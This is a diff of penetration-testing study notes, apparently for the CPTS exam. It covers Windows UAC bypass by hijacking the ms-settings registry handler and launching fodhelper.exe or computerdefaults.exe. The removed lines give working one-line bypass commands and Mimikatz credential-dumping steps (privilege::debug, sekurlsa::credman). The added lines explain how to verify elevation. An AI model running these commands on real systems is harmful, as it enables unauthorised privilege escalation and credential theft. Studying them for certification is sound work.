@@ -355,67 +355,47 @@ reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute 
 > [!important]  
 > `fodhelper.exe` and `computerdefaults.exe` are legitimate Windows executables that can be abused through **per-user registry modifications** to bypass UAC.
 
-🚨Bypass UAC
+### 🧠 Important Verification
 
-> [!info]  
-> **Goal:** Bypass **User Account Control (UAC)** to execute a command with elevated Administrator privileges.
-
-### 🔓 Method 1 — `fodhelper.exe`
+Running:
 
 ```cmd
-reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
+whoami
 ```
 
-**What happens:**
+may still return:
 
 ```text
-HKCU registry modification
-        ↓
-ms-settings handler hijacked
-        ↓
-fodhelper.exe launched
-        ↓
-UAC bypass
-        ↓
-cmd.exe executes elevated
+mcharles
 ```
 
-### 🔓 Method 2 — `computerdefaults.exe`
-
-```cmd
-reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
-```
-
-> [!important]  
-> `fodhelper.exe` and `computerdefaults.exe` are legitimate Windows executables that can be abused through **per-user registry modifications** to bypass UAC.
-
-
-```
-# 🔓 11. Mimikatz `sekurlsa::credman`
-
-Start Mimikatz:
-
-```cmd
-C:\Users\Administrator\Desktop> mimikatz.exe
-```
-
-Then enable the privileges required for credential extraction:
+This is because the **username itself does not change**. The important difference is the **integrity/elevation level** of the process.
 
 ```text
-mimikatz # privilege::debug
-Privilege '20' OK
+mcharles
+   │
+   └── UAC bypass
+          ↓
+   Elevated Administrator context
+          ↓
+   Access to protected locations
 ```
 
-Next, use:
+> [!warning]  
+> **`whoami` alone is not sufficient to prove that UAC bypass succeeded.** Verify the process's elevation/integrity level and whether you can access Administrator-protected resources.
+
+### 🎯 CPTS Memory
 
 ```text
-mimikatz # sekurlsa::credman
-```
-
-
-
----
-
+UAC Bypass
+   ↓
+Modify HKCU\Software\Classes\ms-settings
+   ↓
+Launch fodhelper.exe / computerdefaults.exe
+   ↓
+Elevated command execution
+   ↓
+Administrator-level access
 ```
 # 🔓 11. Mimikatz `sekurlsa::credman`
 
